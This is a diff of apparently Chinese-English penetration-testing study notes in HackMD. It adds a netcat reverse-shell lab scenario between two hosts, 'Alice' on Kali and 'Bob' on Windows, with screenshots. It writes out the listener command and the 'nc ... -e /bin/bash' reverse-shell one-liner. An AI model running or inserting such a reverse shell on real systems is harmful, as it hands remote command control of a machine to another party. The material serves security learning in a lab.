@@ -114,5 +114,32 @@ nc -nv 10.11.0.22 4444
 
 ![image](https://hackmd.io/_uploads/SJ8K4aUU0.png)
 > ipconfig 顯示 Bob 的IP
-:::
+
 #### (2) Reverse Shell Scenario
+Alice needs help from Bob.
+![image](https://hackmd.io/_uploads/rk2BqA8LA.png)
+> Alice 在內網\
+> We can send control of Alice's command prompt to Bob.\
+> (Reverse Shell)
+##### (Bob: Windows) > Listen
+IP: 10.11.0.22
+```
+nc -nvlp 4444 
+```
+![image](https://hackmd.io/_uploads/Hy1oj0LUA.png)
+> Listen port 4444 for incoming shell
+
+##### (Alice: Kali) > Send
+Send reverse shell to Bob
+```
+nc -nv {Destination IP} {Destination port} -e /bin/bash
+```
+![image](https://hackmd.io/_uploads/HyUHn0UIR.png)
+> -e /bin/bash: 在連接建立後，執行 /bin/bash，這是 Linux 的命令行解釋
+
+##### Back to (Bob: Windows)
+![image](https://hackmd.io/_uploads/rkfz6CL8C.png)
+> 成功在 Windows 上遠端執行 Kali command
+
+## Socat
+
